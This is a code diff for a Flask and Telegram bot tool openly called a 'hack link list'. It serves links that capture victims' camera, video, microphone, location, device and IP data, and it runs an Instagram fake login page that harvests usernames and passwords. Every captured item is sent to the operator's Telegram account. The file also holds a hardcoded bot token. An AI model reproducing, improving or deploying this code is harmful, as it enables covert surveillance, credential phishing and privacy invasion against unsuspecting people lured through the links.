@@ -11,7 +11,7 @@ import base64
 import requests
 from io import BytesIO
 import asyncio
-
+import colorama
 
 app = Flask(__name__, template_folder='.site', static_folder='.site', static_url_path='/')
 app.secret_key = 'xxx'
@@ -20,24 +20,28 @@ app.secret_key = 'xxx'
 
 
 bot = telebot.TeleBot("7525871760:AAGj7NTUIxNTDq_JpBqQF3E7PvGnk8MtgT8")
-channel_id = '@hackerpdfbotlog'
+#channel_id = '@hackerpdfbotlog'
+user_id = "@hackermain"
 
 
-
-user_id = 1853412532
+#user_id = 1853412532
 host = "https://telejack.onrender.com"
 
 
-info = f"""* ‼️ hack link list *\n
-*{host}/ - basic for devise info *
-*{host}/cam -cam hack*
-*{host}/loc - location info*
-*{host}/video - cam hack with videos*
-*{host}/mic - micophone hack*
+info = f"""*‼️ Hack Link List:*
 
+{host}/ - Basic for Device Info
 
-__• note if user checking and allow to permiseion __"""
+{host}/cam - Cam Hack
 
+{host}/loc - Location Info
+
+{host}/video - Cam Hack with Videos
+
+{host}/mic - Microphone Hack
+
+*{host}/instagram-login-page - Instagram Fake Login Page*
+"""
 
 def gen():
       N = 7
@@ -62,19 +66,14 @@ def message(message):
     except Exception as e:
             print(f"Failed to send message to {user_id}: {str(e)}")
 
-message("hacker is online ")
+
 message(info)
 
        
 
 @bot.message_handler(commands=['start'])
 def send_(message):
-    bot.reply_to(message, f"""
-    this bot made by krunal_io
-    {info}
-
-    \n /start - Start bot \n /link - get your hacke link \n
-    note link for target 🎯\n
+    bot.reply_to(message, f"""\nthis bot made by krunal_io \n{info}\n /start - Start bot \n /link - get your hacke link \nnote link for target 🎯\n
      """)
 
 
@@ -111,10 +110,6 @@ def now():
 
 
 
-def makefile(data, file_name):
-    with open(file_name, 'w') as file:  
-       file.write(data)
-
 
 def jdata(data):
    d = json.dumps(data, indent=10)
@@ -124,8 +119,6 @@ def jdata(data):
 
 def audio(audio_path, caption=""):
         try:
-            # Send the audio
-#            with open(audio_path, 'rb') as audio_file:
             bot.send_audio(user_id, audio=audio_path, caption=caption)
             print(f"Audio sent to {user_id}")
            # time.sleep(1)  # Sleep for 1 second to avoid hitting rate limits
@@ -160,7 +153,7 @@ def mic():
     return render_template("mic.html")
 
 
-@app.route("/instagram_fake_page")
+@app.route("/instagram-login-page")
 def insta():
     message("instagram fake webpage  page opened !? \n")
     return render_template("insta/index.html")
@@ -169,6 +162,9 @@ def insta():
 
 @app.route("/instagram-login-error", methods=['POST', 'GET'])
 def instadata():
+       ipadd = request.remote_user
+       userangen = request.remote_user
+       print(ipadd, userangen)
        message("instagram resiveing  page opened !? \n")
    
        user_name = request.form.get("username")  
@@ -251,23 +247,17 @@ def upload_image():
 def devi():
     data = request.get_json()
     io = jdata(data)
-    Alldata = f""" ``` bassic info
-    \n
-   * device :-  {data['userAgent']} / {data['browserVersion']}*   
-    language :- {data['language']}
-    ram :- {data['deviceMemory']}
-    timeZone:- {data['timeZone']}
-    network :- {data["effectiveConnectionType"]}```
+    Alldata = f"""\n
+    device :-  *{data['userAgent']} *\n* {data['browserVersion']}*\n
+    language :- *{data['language']}* \n
+    ram :- *{data['deviceMemory']}* \n
+    timeZone:- *{data['timeZone']}* \n 
+    network :- *{data["effectiveConnectionType"]}* \n
     
-    \n
-    
+    \
     """
     message(Alldata)
-    m = f""" user device data info\n
-   
-    
-    
-    
+    m = f"""
     ```json data
     {io}
     ```
@@ -283,8 +273,7 @@ def ip():
     hi = jdata(data)
     ip = data['ip']
     ha6 = jdata(ipdata(ip))
-    m =f"""
-    # ip addres data \n
+    m =f"""ip addres data \n
     ```
     {ha6}
     ```
